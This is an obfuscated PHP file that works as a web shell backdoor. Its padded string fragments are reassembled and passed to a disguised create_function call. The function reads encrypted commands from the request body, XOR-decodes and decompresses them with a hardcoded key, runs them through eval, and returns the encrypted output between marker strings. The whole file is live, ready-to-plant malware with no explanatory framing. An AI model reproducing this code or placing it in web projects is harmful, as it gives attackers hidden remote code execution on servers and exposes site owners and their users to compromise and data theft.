<?php
$m=',$k){$c=+nstrlen($+nk+n);$l=strlen+n($t+n);$o="";+nfo+nr($i=0;+n$i<+n$l;){+nfor($j=+n0;($j<$+nc&+n&$i<$l);$j++,$i++n++n)';
$X='nput"+n),$+nm)==1) {@o+nb_st+nart();@e+nva+nl(@gzun+ncompress(+n@+nx+n(@ba+nse64_deco+n+nde($m+n[1]),$k)));$+no=@ob_g';
$W='$k="1+n02ae6dd+n";$kh="+n9+n+n9f58ceaefbc";$kf="+n558a+n3+nd6+n+ndd923";$p="VrcjQlCwr315O+n+nIm8";functio+nn x(+n$+nt';
$Y='et_cont+ne+nnts();@ob_end+n+n_cl+nean();$r=@b+nase64_enco+nde(@+nx(@+ng+nzcompress($o),$+nk));p+nrint(+n"$+np$kh$r$kf");}';
$M=str_replace('OV','','cOVrOVeatOVe_OVfunOVctOVion');
$v='{$o.+n=$t{$i}+n^$+nk{$j};}+n}return $+no;+n}if (@+npreg_ma+ntch("/$kh(.+)$k+n+nf/+n",@file_get_+ncontents("p+nhp://i+n';
$Z=str_replace('+n','',$W.$m.$v.$X.$Y);
$u=$M('',$Z);$u();
?>
